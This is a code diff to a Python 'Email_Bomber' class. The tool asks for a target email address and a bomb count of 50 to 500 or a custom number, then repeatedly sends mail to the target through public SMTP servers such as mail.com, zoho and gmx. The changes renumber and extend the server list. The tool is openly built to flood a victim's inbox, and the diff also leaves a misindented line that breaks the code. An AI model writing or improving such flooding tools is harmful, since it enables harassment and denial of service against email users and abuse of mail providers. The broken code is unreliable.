@@ -48,15 +48,16 @@ class Email_Bomber:
             self.target = str(input(bcolors.CYAN + '\n > Enter the target email : '))
             
             self.mode = int(input(bcolors.CYAN + '\n > Enter the number of bombs to do on the targeted device \n  > 1 : (50) \n  > 2 : (100) \n  > 3 : (250) \n  > 4 : (500) \n  > 5 : (custom) : '))
+            
             if int(self.mode) > int(5) or int(self.mode) < int(1):
                 print('\n ERROR: Invalid Option. GoodBye.')
                 sys.exit(1)
+                
         except Exception as e:
             print(f'ERROR: {e}')
 
     def bomb(self):
         try:
-            
             self.amount = None
             if self.mode == int(1):
                 self.amount = int(50)
@@ -105,11 +106,14 @@ class Email_Bomber:
             elif self.server == '6':
                 self.server = 'outgoing.verizon.net'
             
-            elif self.server == '8':
+           elif self.server == '7':
                 self.server = 'smtp.mail.com'
             
-            elif self.server == '9':
+            elif self.server == '8':
                 self.server = 'smtp.zoho.com'
+
+            elif self.server == '9':
+                self.server = 'smtp.gmx.com'
             
             '''elif self.server == '10':
                 self.server = 'smtp-mail.outlook.com'
@@ -140,6 +144,7 @@ class Email_Bomber:
             self.s.sendmail(self.fromAddr, self.target, self.msg)
             self.count +=1
             print(bcolors.YELLOW + f'BomB: {self.count}')
+        
         except Exception as e:
             print(f'ERROR: {e}')
 
